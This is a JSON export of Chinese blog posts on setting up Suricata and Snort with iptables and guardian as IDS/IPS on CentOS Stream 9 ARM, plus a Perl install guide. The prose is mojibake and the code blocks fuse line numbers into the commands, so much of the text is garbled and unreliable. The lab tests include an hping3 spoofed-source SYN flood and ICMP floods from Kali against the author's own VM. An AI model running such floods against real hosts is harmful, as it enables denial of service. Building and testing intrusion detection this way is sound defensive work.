ç®€ä»‹Suricataæ˜¯ä¸€ä¸ªå…è´¹ã€å¼€æºã€æˆç†Ÿã€å¿«é€Ÿä¸”å¼ºå¤§çš„ç½‘ç»œå¨èƒæ£€æµ‹å¼•æ“ã€‚å¯ä»¥è¢«ç”¨ä½œIDSå¼•æ“ï¼ˆåªèƒ½æ£€æµ‹ä¸èƒ½é˜»æ–­ï¼‰ã€IPSï¼ˆå¯ä»¥æ£€æµ‹ä¹Ÿå¯ä»¥é˜»æ–­ï¼‰ã€ç½‘ç»œå®‰å…¨ç›‘æ§ã€ç¦»çº¿pcapå¤„ç†å·¥å…·ã€‚ Suricata ä½¿ç”¨å¼ºå¤§è€Œå¹¿æ³›çš„è§„åˆ™å’Œç­¾åè¯­è¨€æ£€æŸ¥ç½‘ç»œæµé‡ï¼Œå¹¶å…·æœ‰å¼ºå¤§çš„ Lua è„šæœ¬æ”¯æŒä»¥æ£€æµ‹å¤æ‚å¨èƒã€‚ ç¯å¢ƒé…ç½®CentOS: CentOS-Stream-9, ARM, Parallelsè™šæ‹Ÿæœº CentOSæ“ä½œç”¨æˆ·ï¼šåœ¨rootç”¨æˆ·ä¸‹è¿›è¡Œsuricata éƒ¨ç½² CentOSæºï¼šé˜¿é‡Œæº ä¾èµ–å®‰è£…å®‰è£…ä¾èµ– 1234dnf makecachednf clean alldnf install epel-release -ydnf update -y 1dnf install diffutils file-devel gcc jansson-devel make nss-devel libyaml-devel libcap-ng-devel libpcap-devel pcre-devel python3 python3-pyyaml rust-toolset zlib-devel curl wget tar lua lua-devel lz4-devel -y æŠ¥é”™ Unable to find a match: file-develã€ jansson-develã€libyaml-develã€lua-devel æ·»åŠ CRBä»“åº“ 1vim /etc/yum.repos.d/centos.repo æœ€åä¸€è¡ŒåŠ å…¥ 12345678[crb]name = =CentOS-$releasever - CRB - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/CRB/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/CRB/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/CRB/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official 12dnf makecacheyum makecache ç”¨crbä¸‹è½½ 1dnf --enablerepo=crb install &lt;åŒ…å&gt; -y å¯ä»¥é€šè¿‡https://pkgs.org/æ¥æŸ¥çœ‹è¦ä¸‹è½½çš„åŒ…ï¼Œæ˜¯å±äºå“ªä¸ªä»“åº“æºçš„ 1dnf --enablerepo=crb install file-devel jansson-devel libyaml-devel lua-devel -y å®‰è£…suricata1dnf install suricata å®‰è£…æˆåŠŸ 12systemctl start suricatasystemctl enable suricata ä¿®æ”¹é…ç½®ã€è§„åˆ™ä¿®æ”¹é…ç½® 1vim /etc/suricata/suricata.yaml æ·»åŠ IPï¼ˆæœ¬æœºIPï¼‰ã€ç½‘å£ï¼ˆéœ€è¦æ¢æµ‹çš„ç½‘å¡,enp0s5ï¼‰ã€nfqï¼ˆä¸ºäº†èƒ½å¼€å¯IPSï¼‰ æ›´æ–°è§„åˆ™ 1suricata-update æµ‹è¯•kaliå‘èµ·floodæ”»å‡» æˆªå›¾å·¦è¾¹æ˜¯centosï¼Œå³è¾¹æ˜¯kaliã€‚kaliå¯¹centoså‘èµ·æ”»å‡» å…ˆä¸å¼€å¯suricataï¼Œç”¨wiresharkæŠ“åŒ…çœ‹ä¸€ä¸‹æµé‡çš„èµ°å‘ å¯ä»¥çœ‹åˆ°æ”¶åˆ°äº†å¾ˆå¤šçš„icmpåŒ…ï¼Œä¼ªè£…æˆäº†ä¸åŒçš„IPã€‚kaliå¤šæ”»å‡»ä¸€ä¼šï¼ŒWiresharkç›´æ¥å´©æºƒäº†ğŸ¶ å¯ç”¨suricataï¼ŒIDSæ¨¡å¼ å¼€å¯IDSæ¨¡å¼ï¼Œä»…èƒ½æ£€æµ‹æ”»å‡»ï¼Œä¸èƒ½æ‹¦æˆª 1suricata -c /etc/suricata/suricata.yaml -i enp0s5 å¯ç”¨suricataï¼ŒIPSæ¨¡å¼ å¼€å¯IPSæ¨¡å¼ï¼Œå¯ä»¥æ£€æµ‹ä¹Ÿå¯ä»¥æ‹¦æˆªã€‚ æŸ¥çœ‹Suricataæ˜¯å¦æ”¯æŒIPSæ¨¡å¼ 1suricata --build-info å¦‚æœè¾“å‡ºæœ‰ï¼š NFQueue support: yes è¡¨ç¤ºæ”¯æŒIPSæ¨¡å¼ -qè®©Suricataä»¥IPSæ¨¡å¼è¿è¡Œï¼Œç›¸å½“äºsnortçš„inlineæ¨¡å¼ã€‚ä¸è¿‡è¿˜éœ€è¦è®¾ç½®ä¸€ä¸‹iptablesçš„NFQUEUEï¼Œè®©Suricataèƒ½è®¿é—®åˆ°ç›¸åº”çš„æ•°æ®åŒ…ï¼Œæœ€ç®€å•çš„æ–¹æ³•æ˜¯ï¼š 12iptables -I INPUT -p tcp -j NFQUEUEiptables -I OUTPUT -p tcp -j NFQUEUE 1suricata -c /etc/suricata/suricata.yaml -q 0 suricataç”¨å®Œä¹‹åï¼Œå†æ¸…é™¤è¿™ä¸ªè§„åˆ™ï¼Œä¸ç„¶ä¼šå½±å“æ­£å¸¸é€šä¿¡ 1iptables -F å‚è€ƒæ–‡ç« https://suricata.io/ https://suricata.readthedocs.io/en/latest/ https://suricata.readthedocs.io/en/latest/install.html https://www.digitalocean.com/community/tutorials/how-to-install-suricata-on-centos-8-stream https://bynss.com/linux/761151.html https://suricata.readthedocs.io/en/latest/quickstart.html https://suricata.readthedocs.io/en/suricata-6.0.0/setting-up-ipsinline-for-linux.html https://blog.csdn.net/Chaowanq/article/details/121563114 https://maskray.me/blog/2013-07-26-ids-ips-with-suricata","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"suricata","slug":"å…¥ä¾µæ£€æµ‹/suricata","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/suricata/"}],"tags":[{"name":"suiricata","slug":"suiricata","permalink":"https://gryffinbit.top/tags/suiricata/"}],"author":"Gryffinbit"},{"title":"ARMå®‰è£…Perlç¯å¢ƒ","slug":"ARMå®‰è£…Perlç¯å¢ƒ","date":"2022-07-27T11:10:31.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/07/27/ARMå®‰è£…Perlç¯å¢ƒ/","permalink":"https://gryffinbit.top/2022/07/27/ARM%E5%AE%89%E8%A3%85Perl%E7%8E%AF%E5%A2%83/","excerpt":"","text":"ç¯å¢ƒmacOS Montereyï¼ŒM1ï¼Œ2020. version 12.4 perl 5, version 32, subversion 1 (v5.32.1) built for aarch64-linux-thread-multi å®‰è£…perl12345678910111213141516171819202122232425262728293031323334yum install perl-Perl4-CoreLibsdnf install cpan# ç”±å†…å»ºçš„cpanå·¥å…·å®‰è£…perlbrewï¼Œä¸å†…å»ºçš„perlå…³è”echo &quot;yes&quot; | sudo cpan App::perlbrew# åˆå§‹åŒ–ï¼Œåœ¨ç”¨æˆ·å®¶ç›®å½•ä¸‹å¯¼å…¥å¿…å¤‡çš„ç¯å¢ƒå˜é‡ç­‰ç­‰perlbrew init# å¯¼å…¥å½“å‰perlbrewçš„ç¯å¢ƒå˜é‡ï¼Œä¸ºäº†ç¡®ä¿æˆ‘å°†å®ƒå†™åœ¨äº†~/.bashrcé‡Œsource ~/perl5/perlbrew/etc/bashrc cat ~/perl5/perlbrew/etc/bashrc &gt;&gt; ~/.bashrc # æŸ¥çœ‹ç°åœ¨å¯ç”¨çš„æ‰€æœ‰perlç‰ˆæœ¬perlbrew available # ä¸‹è½½å¹¶å®‰è£…å¯¹åº”çš„ç‰ˆæœ¬ï¼Œå®ƒä¼šé»˜è®¤å®‰è£…åˆ°~/perl5ç›®å½•ä¸‹ï¼Œå¹¶ä¸”ä»¥ç‰ˆæœ¬å·åŒºåˆ†å¥½ï¼ŒçœŸæ­£å¼•ç”¨çš„æ—¶å€™å¯ä»¥ç”¨perlbrewéå¸¸æ–¹ä¾¿çš„åˆ‡æ¢perlbrew install perl-5.36.0# ä¸‹è½½é€Ÿåº¦å¾ˆæ…¢ï¼Œæˆ‘åœ¨ç½‘é¡µä¸Šä¸‹è½½å¥½åç§»åˆ°äº†è¿™ä¸ªæŒ‡å®šè·¯å¾„# Fetching perl 5.36.0 as /root/perl5/perlbrew/dists/perl-5.36.0.tar.gz Download https://cpan.metacpan.org/authors/id/R/RJ/RJBS/perl-5.36.0.tar.gz to /root/perl5/perlbrew/dists/perl-5.36.0.tar.gzmv perl-5.36.0.tar.gz /root/perl5/perlbrew/dists/perl-5.36.0.tar.gz # æŸ¥çœ‹å·²å®‰è£…åœ¨æœ¬åœ°çš„perlåˆ—è¡¨perlbrew list # è®¾ç½®é»˜è®¤ä½¿ç”¨çš„perlç‰ˆæœ¬ï¼Œæ³¨æ„ï¼Œè¿™ä¸ªä¸å½±å“apt-getå‘½ä»¤ï¼Œå› ä¸ºæ‰€æœ‰çš„bin/libéƒ½æ˜¯ä¸å…¶åˆ†å¼€çš„perlbrew switch perl-5.36.0 # æš‚æ—¶åˆ‡æ¢ä½¿ç”¨çš„perlç‰ˆæœ¬ï¼Œæ¯”å¦‚åœ¨ä¸€ä¸ªshellè„šæœ¬é‡Œï¼Œåˆ‡æ¢å®Œæˆåï¼Œä½ å¯ä»¥æŸ¥çœ‹perlå½“å‰çš„ç‰ˆæœ¬æ˜¯å¦å¯¹åº”perlbrew use perl-5.8.1perl -v# ç”¨perlbrewç®¡ç†ä¸‹è½½cpanperlbrew install-cpanm å‚è€ƒæ–‡ç« https://kunpengcompute.github.io/2020/11/27/zai-arm-ping-tai-shang-wan-zhuan-perl/","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"ARM","slug":"ARM","permalink":"https://gryffinbit.top/tags/ARM/"},{"name":"Perl","slug":"Perl","permalink":"https://gryffinbit.top/tags/Perl/"}],"author":"Gryffinbit"},{"title":"snort+iptableså®ç°æ•°æ®åŒ…é˜»æ–­åŠŸèƒ½","slug":"snort-iptableså®ç°æ•°æ®åŒ…é˜»æ–­åŠŸèƒ½","date":"2022-07-26T11:13:27.000Z","updated":"2024-11-12T06:59:21.000Z","comments":true,"path":"2022/07/26/snort-iptableså®ç°æ•°æ®åŒ…é˜»æ–­åŠŸèƒ½/","permalink":"https://gryffinbit.top/2022/07/26/snort-iptables%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8C%85%E9%98%BB%E6%96%AD%E5%8A%9F%E8%83%BD/","excerpt":"","text":"å‰è¨€æ•´ä¸ªSNATç¯å¢ƒå®ç°çš„æ­å»ºï¼Œè·³è½¬Blogï¼š SNATå…±äº«ä¸Šç½‘ åœ¨centos-stream-9ä¸Šå®‰è£…snort2.9ï¼Œè·³è½¬Blogï¼š centos-stream-9ä¸‹å®‰è£…snort2-9ã€armè™šæ‹Ÿæœºç‰ˆã€‘ snort2.9è§„åˆ™é›†é…ç½®ï¼Œè·³è½¬Blogï¼š centos-stream-9 snort2.9è§„åˆ™é›†é…ç½® ç¯å¢ƒé…ç½®CentOS: CentOS-Stream-9, ARM, ã€Parallelsè™šæ‹Ÿæœºï¼ŒNATï¼Œé˜²ç«å¢™ã€‘ CentOSæ“ä½œç”¨æˆ·ï¼šåœ¨rootç”¨æˆ·ä¸‹è¿›è¡Œsnortéƒ¨ç½² CentOSçš„ iptablesç‰ˆæœ¬ï¼šiptables v1.8.8 (nf_tables) Ubuntu: Ubuntu 20.04.2 ARM64 ã€clientå†…ç½‘å®¢æˆ·æœºã€‘ snortç‰ˆæœ¬ï¼šsnort-2.9.20 daqç‰ˆæœ¬ï¼š daq-2.0.7 CentOSæºï¼šé˜¿é‡Œæº è§„åˆ™é›†ç‰ˆæœ¬ï¼š 29200 Tips: æ³¨æ„ï¼è§„åˆ™é›†å’Œsnortç‰ˆæœ¬è¦å¯¹åº”ä¸Šï¼Œå› ä¸ºä¸åŒç‰ˆæœ¬çš„å¯èƒ½ä¼šæœ‰ä¸€äº›æ–°è§„åˆ™ä¸èƒ½åŒ¹é…ä¸Šï¼Œå°±ä¸èƒ½é¡ºåˆ©è¿è¡Œã€‚å‚è€ƒå®˜ç½‘ï¼Œæ¯ä¸ªæ–°ç‰ˆæœ¬çš„è¯´æ˜ï¼ŒåŒ…æ‹¬è§„åˆ™é›†çš„è¯´æ˜ï¼š è§„åˆ™é›† ç‰ˆæœ¬è¯´æ˜ snort+iptableså®ç°IPSçš„åŠŸèƒ½è¯´æ˜snortæ˜¯ä¸€ä¸ªIDSï¼Œåªèƒ½å®ç°æ£€æµ‹ä¸èƒ½é˜»æ–­æ•°æ®åŒ… iptableså¯ä»¥æ‹¦æˆªæ•°æ®åŒ…ã€‚ æ‰€ä»¥ç”¨snort+iptableså…±åŒä½¿ç”¨ï¼Œæ¥å®ç°æ•°æ®åŒ…çš„é˜»æ–­åŠŸèƒ½ã€‚å……å½“IPSã€‚ ä½†æ˜¯é€šå¸¸iptablesæ˜¯å†™æ­»çš„ã€‚å°±æŠŠæ•°æ®åŒ…ä¸€ç›´æ‹¦æˆªï¼Œä¸ç®¡æœ‰æ²¡æœ‰è¿™ä¸ªåŒ… æ­¤æ¬¡å®éªŒã€‚å°±æ˜¯è®©snortçš„IDSå’Œiptablesä¸€èµ·è”åŠ¨ã€‚ä½¿å¾—snortå¼€å¯IDSæ£€æµ‹æ—¶ï¼Œåªæœ‰è¢«æ£€æµ‹åˆ°äº†è§„åˆ™é‡Œçš„æ•°æ®åŒ…ï¼Œå®ƒæ‰ä¼šè‡ªåŠ¨è®©iptablesæ‹¦æˆªã€‚ æµ‹è¯• Snort+iptables å®ç°IPSåŠŸèƒ½ã€æ‰‹åŠ¨iptablesæ·»åŠ ã€‘ å°†enp0s5å¼€å¯å¤–ç½‘ç½‘å¡ã€‚snort.conf HOME_NETéœ€è¦ä¿®æ”¹ æ­¤æ—¶enp0s5ï¼Œæ˜¯å…±äº«ç½‘ç»œæ¨¡å¼ï¼Œå¯ä»¥è®¿é—®å¤–ç½‘ï¼Œå¯ä»¥å’Œä¸€ä¸ªç”µè„‘ä¸‹å…¶ä»–è™šæ‹Ÿæœºè¿›è¡Œé€šä¿¡ã€‚ipåœ°å€ä¸º10.211.55.12 ï¼ˆå…¶å®å¼€ä¸å¼€éƒ½å¯ä»¥ï¼Œåªè¦æ»¡è¶³HOME_NETå’Œç½‘å¡çš„IPæ˜¯å¯¹åº”çš„å°±å¯ä»¥ï¼‰ åœ¨snorté‡ŒåŠ å…¥è§„åˆ™ 1vim /etc/snort/rules/local.rules ä¸‹é¢çš„è§„åˆ™ï¼Œæ„æ€å°±æ˜¯ä¸¢å¼ƒpingåŒ… 1drop icmp any any -&gt; $HOME_NET any (msg:&quot;ICMP test&quot;; sid:10000001; rev:001;) å¯åŠ¨snort 1snort -Q --daq nfq --daq-var device=enp0s5 --daq-var queue=1 -u snort -g snort -c /etc/snort/snort.conf -A console Iptables æ·»åŠ è§„åˆ™ã€å¼€å¯å¦å¤–ä¸€ä¸ªshellã€‘ 1iptables -I INPUT -j NFQUEUE --queue-num 1 --queue-bypass kaliè¿›è¡Œpingçš„è¡Œä¸º å½“snortæœªå¼€å¯ï¼Œä¸”æœªåŠ å…¥iptablesè§„åˆ™æ—¶ã€‚kaliå¯ä»¥æˆåŠŸçš„pingé€š10.211.55.12 å½“snortå¼€å¯ï¼Œä¸”åŠ å…¥iptablesè§„åˆ™æ—¶ã€‚kaliæ— æ³•pingé€š10.211.55.12 å½“snortå¼€å¯ï¼Œä½†æ²¡æœ‰åŠ å…¥iptablesè§„åˆ™æ—¶ã€‚kali å¯ä»¥pingé€š10.211.55.12 ã€‚ä½†snortä¸èƒ½æ£€æµ‹åˆ° å®‰è£…é…ç½®guardian åœ¨å®˜ç½‘ä¸‹è½½è„šæœ¬ ä¸‹è½½é“¾æ¥ å®˜ç½‘é“¾æ¥ å°†ä¸‹è½½çš„æ–‡ä»¶æ”¾åˆ°snortfileæ–‡ä»¶å¤¹ 123# é€šè¿‡ç‰©ç†æœºscpå°†æ–‡ä»¶ä¼ åˆ°äº†/rootä¸‹# è§£å‹åˆ°snortFiletar -zxvf guardian-1.7.tar.gz -C snortFile/ åˆ›å»ºguardianæ–‡ä»¶å¤¹ 12345678cd snortFile/guardian-1.7/touch /etc/snort/guardian.ignoretouch /etc/snort/guardian.targettouch /var/log/snort/guardian.logcp guardian.pl /usr/local/bin/cp scripts/iptables_block.sh /usr/local/bin/guardian_block.shcp scripts/iptables_unblock.sh /usr/local/bin/guardian_unblock.shcp guardian.conf /etc/snort ç¼–è¾‘guardiané…ç½®æ–‡ä»¶ 1vim /etc/snort/guardian.conf ç½‘å¡é€‰æ‹©äº†nat serverè¿æ¥å†…ç½‘çš„ç½‘å¡ 12345678HostIpAddr 10.211.55.12Interface enp0s5LogFile /var/log/snort/guardian.logAlertFile /var/log/snort/alert //alertæ–‡ä»¶çš„ä½ç½®IgnoreFile /etc/snort/guardian.ignore //ç™½åå•targetFile /etc/snort/guardian.target //é»‘åå•TimeLimit 120 //é˜»æ–­æ—¶é—´,ä»¥ç§’ä¸ºå•ä½ å¯åŠ¨guardian 1/usr/bin/perl /usr/local/bin/guardian.pl -c /etc/snort/guardian.conf æ‰§è¡Œperlæ–‡ä»¶ æŠ¥é”™ ï¼ˆARMæ¶æ„ï¼‰æŠ¥é”™é—®é¢˜å‚è§å¦å¤–ä¸€ç¯‡Blogï¼šhttps://gryffinbit.top/2022/07/27/arm%E5%AE%89%E8%A3%85perl%E7%8E%AF%E5%A2%83/ ä¸´æ—¶è§£å†³æ–¹æ¡ˆè§ï¼šhttps://stackoverflow.com/questions/47990911/which-module-do-i-need-when-i-got-error-info-cant-locate-getopts-pl-in-inc 1&gt;perl -I /usr/lib/libperl4-corelibs-perl /usr/bin/perl /usr/local/bin/guardian.pl -c /etc/snort/guardian.conf æµ‹è¯• Snort+iptables å®ç°IPSåŠŸèƒ½ã€guardianè‡ªåŠ¨åŒ–ã€‘ åœ¨snorté‡ŒåŠ å…¥è§„åˆ™ 1vim /etc/snort/rules/local.rules 1drop icmp any any -&gt; $HOME_NET any (msg:&quot;ICMP test&quot;; sid:10000001; rev:001;) å¯åŠ¨snort 1snort -A fast -i enp0s5 -u snort -g snort -c /etc/snort/snort.conf å¿«é€ŸæŠ¥è­¦æ¨¡å¼ï¼Œå°†å‘Šè­¦ä¿¡æ¯ç®€å•çš„å†™å…¥è­¦æŠ¥ 12cd /var/log/snorttail -f alert å¯åŠ¨guardian 1/usr/bin/perl /usr/local/bin/guardian.pl -c /etc/snort/guardian.conf æ”»å‡»æœºå‘èµ·æ”»å‡» ä½¿ç”¨kaliå¯¹10.37.129.1å‘èµ·æ‰«æè¿›æ”» å‘èµ·tcpæ”»å‡»ï¼ˆfloodæ”»å‡»ï¼‰ 1hping3 --flood -S --rand-source 10.37.129.1 å‚è€ƒæ–‡ç« guardian perlæŠ¥é”™ä¿®å¤ libperl4-corelibs-perl å®‰è£… http://www.qfrost.com/undefined/snort/ https://blog.csdn.net/hexf9632/article/details/98200876","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"å…¥ä¾µæ£€æµ‹/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"},{"name":"centos-stream-9","slug":"centos-stream-9","permalink":"https://gryffinbit.top/tags/centos-stream-9/"},{"name":"ARMæ¶æ„","slug":"ARMæ¶æ„","permalink":"https://gryffinbit.top/tags/ARM%E6%9E%B6%E6%9E%84/"},{"name":"parallelsè™šæ‹Ÿæœº","slug":"parallelsè™šæ‹Ÿæœº","permalink":"https://gryffinbit.top/tags/parallels%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"guardian","slug":"guardian","permalink":"https://gryffinbit.top/tags/guardian/"}],"author":"Gryffinbit"},{"title":"centos-stream-9 snort2.9è§„åˆ™é›†é…ç½®","slug":"centos-stream-9-snort2-9è§„åˆ™é›†é…ç½®","date":"2022-07-25T16:53:10.000Z","updated":"2024-11-12T06:59:48.000Z","comments":true,"path":"2022/07/26/centos-stream-9-snort2-9è§„åˆ™é›†é…ç½®/","permalink":"https://gryffinbit.top/2022/07/26/centos-stream-9-snort2-9%E8%A7%84%E5%88%99%E9%9B%86%E9%85%8D%E7%BD%AE/","excerpt":"","text":"å‰è¨€åœ¨centos-stream-9ä¸Šå®‰è£…snort2.9ï¼Œè·³è½¬Blogï¼š centos-stream-9ä¸‹å®‰è£…snort2-9ã€armè™šæ‹Ÿæœºç‰ˆã€‘ ç¯å¢ƒé…ç½®CentOS: CentOS-Stream-9, ARM, Parallelsè™šæ‹Ÿæœº CentOSæ“ä½œç”¨æˆ·ï¼šåœ¨rootç”¨æˆ·ä¸‹è¿›è¡Œsnortéƒ¨ç½² snortç‰ˆæœ¬ï¼šsnort-2.9.20 daqç‰ˆæœ¬ï¼š daq-2.0.7 CentOSæºï¼šé˜¿é‡Œæº è§„åˆ™é›†ç‰ˆæœ¬ï¼š 29200 Tips: æ³¨æ„ï¼è§„åˆ™é›†å’Œsnortç‰ˆæœ¬è¦å¯¹åº”ä¸Šï¼Œå› ä¸ºä¸åŒç‰ˆæœ¬çš„å¯èƒ½ä¼šæœ‰ä¸€äº›æ–°è§„åˆ™ä¸èƒ½åŒ¹é…ä¸Šï¼Œå°±ä¸èƒ½é¡ºåˆ©è¿è¡Œã€‚å‚è€ƒå®˜ç½‘ï¼Œæ¯ä¸ªæ–°ç‰ˆæœ¬çš„è¯´æ˜ï¼ŒåŒ…æ‹¬è§„åˆ™é›†çš„è¯´æ˜ï¼š è§„åˆ™é›† ç‰ˆæœ¬è¯´æ˜ snortå·¥ä½œæ¨¡å¼ã€é…ç½®æ–‡ä»¶ä»‹ç»snortå·¥ä½œæ¨¡å¼ã€é…ç½®æ–‡ä»¶ Blogè·³è½¬é“¾æ¥ï¼š snortçš„å·¥ä½œæ¨¡å¼ snorté…ç½®æ–‡ä»¶ï¼ˆå®šä¹‰ã€ä½¿ç”¨å˜é‡ï¼‰ é…ç½®snortæ›´æ–°å…±äº«åº“ 1sudo ldconfig åˆ›å»ºç¬¦å·è¿æ¥ snortè¢«å®‰è£…åˆ° /usr/local/bin/snort åˆ›å»ºç¬¦å·é“¾æ¥åˆ° /usr/sbin/snort 1sudo ln -s /usr/local/bin/snort /usr/sbin/snort åˆ›å»ºsnortç”¨æˆ· 12groupadd snortuseradd snort -r -s /sbin/nologin -c SNORT_IDS -g snort å‚æ•°è¯´æ˜ï¼š -rï¼šåˆ›å»ºä¸€ä¸ªç³»ç»Ÿè´¦æˆ· -sï¼šç”¨æˆ·ç™»å½•åä½¿ç”¨çš„shellåç§°ï¼ˆé»˜è®¤å€¼ä¸å¡«å†™ï¼Œè¿™æ ·ç³»ç»Ÿä¼šæŒ‡å®šé¢„è®¾çš„ç™»å…¥shellï¼Œæ ¹æ®&#x2F;etc&#x2F;default&#x2F;useraddé¢„è®¾å€¼ï¼‰ã€sbin&#x2F;nologin ä»£è¡¨è¿™ä¸ªç”¨æˆ·æ— æ³•ä½¿ç”¨bashæˆ–å…¶ä»–shellæ¥ç™»é™†ç³»ç»Ÿï¼Œå³ä½¿ç»™äº†å¯†ç ä¹Ÿä¸è¡Œï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨ç³»ç»Ÿèµ„æºã€‚åªæ˜¯ä¸èƒ½ç™»é™†ä¸»æœºè€Œå·²ã€‚ã€‘ -gï¼šgroupåç§°ã€æ·»åŠ åˆ°snortç»„ä¸‹ã€‘ -cï¼šcommentï¼Œæ³¨é‡Šè¯´æ˜æ  åˆ›å»ºsnortæ–‡ä»¶å¤¹ åˆ›å»ºsnortæ–‡ä»¶å¤¹ç”¨ä»¥å­˜æ”¾snorté…ç½®æ–‡ä»¶ 123mkdir -p /etc/snort/rulesmkdir /var/log/snortmkdir /usr/local/lib/snort_dynamicrules ç»™æ–‡ä»¶å¤¹èµ‹äºˆæƒé™ 123456chmod -R 5775 /etc/snortchmod -R 5775 /var/log/snortchmod -R 5775 /usr/local/lib/snort_dynamicruleschown -R snort:snort /etc/snortchown -R snort:snort /var/log/snortchown -R snort:snort /usr/local/lib/snort_dynamicrules 775æƒé™ï¼š rootæœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ ç»„ç”¨æˆ·æœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ å…¶ä»–ç”¨æˆ·æœ‰è¯»ã€æ‰§è¡Œæƒé™ è¯»å–æƒé™ r&#x3D;4ã€‚å†™å…¥æƒé™ w&#x3D;2ã€‚æ‰§è¡Œæƒé™ x&#x3D;1 ç¬¬ä¸€ä¸ªæ•°å­— ï¼šæ‹¥æœ‰è€…æƒé™ï¼ˆrootï¼Œæ–‡ä»¶æ‰€æœ‰è€…ï¼‰ ç¬¬äºŒä¸ªæ•°å­— ï¼šç»„ç”¨æˆ·æƒé™ï¼ˆä¸æ–‡ä»¶æ‰€æœ‰è€…å±äºåŒä¸€ä¸ªç”¨æˆ·ç»„ï¼‰ ç¬¬ä¸‰ä¸ªæ•°å­— ï¼šå…¶ä»–ç”¨æˆ·æƒé™ å°†è¿™äº›æ–‡ä»¶çš„æ‰€å±ä¿®æ”¹ä¸ºä¹‹å‰åˆ›å»ºçš„snortç»„é‡Œé¢çš„snortç”¨æˆ· æŸ¥çœ‹æ–‡ä»¶æ‰€å± ls -l &lt;file&gt; ç¬¬ä¸€åˆ—å«ä¹‰ï¼š â€‹ ç¬¬ä¸€ä¸ªå­—æ¯å«ä¹‰ï¼š â€‹ ç¬¬ä¸€ä¸ªå­—æ¯dï¼šæ„å‘³ç€å†…å®¹æ˜¯ç›®å½•æˆ–æ–‡ä»¶ â€‹ å¦‚æœç¬¬ä¸€ä¸ªæ˜¯-ï¼šæ„å‘³ç€å®ƒçš„å†…å®¹æ˜¯æ–‡ä»¶ â€‹ ç¬¬ä¸€ä¸ªæ˜¯lï¼šæ„å‘³ç€å†…å®¹æ˜¯é“¾æ¥æ–‡ä»¶ â€‹ åé¢çš„å†…å®¹æ˜¯æ–‡ä»¶æ‰€å± â€‹ ï¼ˆå¯¹åº”ç€ä¸‰ä¸ªæ•°å­—æƒé™775ï¼‰ â€‹ å‰ä¸‰ä¸ªå­—æ¯æ˜¯æ–‡ä»¶æ‹¥æœ‰è€…æƒé™ â€‹ ä¸­é—´ä¸‰ä¸ªæ˜¯æ–‡ä»¶æ‰€æœ‰ç»„æƒé™ â€‹ åä¸‰ä¸ªæ˜¯å…¶ä»–äººè®¿é—®æ–‡ä»¶çš„æƒé™ ç¬¬äºŒåˆ—å«ä¹‰ï¼šå¤šå°‘é“¾æ¥æŒ‡å‘è¿™ä¸ªæ–‡ä»¶ ç¬¬ä¸‰åˆ—å«ä¹‰ï¼šè°æ˜¯è¿™ä¸ªæ–‡ä»¶&#x2F;æ–‡ä»¶å¤¹çš„æ‰€æœ‰è€… ç¬¬å››åˆ—å«ä¹‰ï¼šè°æ˜¯è¿™ä¸ªæ–‡ä»¶&#x2F;æ–‡ä»¶å¤¹æ‰€æœ‰ç»„ ç¬¬äº”åˆ—å«ä¹‰ï¼šè¿™ä¸ªæ–‡ä»¶&#x2F;æ–‡ä»¶å¤¹çš„ä»¥å­—èŠ‚ä¸ºå•ä½çš„å¤§å°ã€‚ç›®å½•çš„å¤§å°æ€»æ˜¯4096å­—èŠ‚ ç¬¬å…­åˆ—å«ä¹‰ï¼šæ–‡ä»¶æœ€åä¿®æ”¹æ—¶é—´ ç¬¬ä¸ƒåˆ—å«ä¹‰ï¼šæ–‡ä»¶åæˆ–ç›®å½•å åˆ›å»ºé»‘ç™½åå•å’Œè§„åˆ™ 123touch /etc/snort/rules/white_list.rulestouch /etc/snort/rules/black_list.rulestouch /etc/snort/rules/local.rules åˆ›å»ºå‘Šè­¦æ–‡ä»¶å¤¹ 1234touch /var/log/snort/alertcd /var/log/snortchown snort.snort alertchmod 700 alert å¤åˆ¶é…ç½®æ–‡ä»¶ ä»ä¸‹è½½çš„snort-2.9.20æ–‡ä»¶å¤¹é‡Œå¤åˆ¶é…ç½®æ–‡ä»¶ 12cp ~/snortFile/snort-2.9.20/etc/*.conf* /etc/snortcp ~/snortFile/snort-2.9.20/etc/*.map /etc/snort ä¸‹è½½snortè§„åˆ™é›†snortå®˜ç½‘æä¾›äº†ä¸‰ç§è§„åˆ™é›†ï¼š ç¤¾åŒºç‰ˆï¼šå…è´¹çš„ï¼Œä½†æ˜¯åªæ˜¯å¾ˆç®€å•çš„è§„åˆ™é™åˆ¶ æ³¨å†Œç‰ˆï¼šå…è´¹æ³¨å†Œåå¯ä»¥è·å¾—codeï¼Œç”¨codeå¯ä»¥ä¸‹è½½æ³¨å†Œç‰ˆè§„åˆ™ è®¢é˜…ç‰ˆï¼šéœ€è¦è®¢é˜…ï¼Œæ‰å¯ä»¥ä¸‹è½½è§„åˆ™ 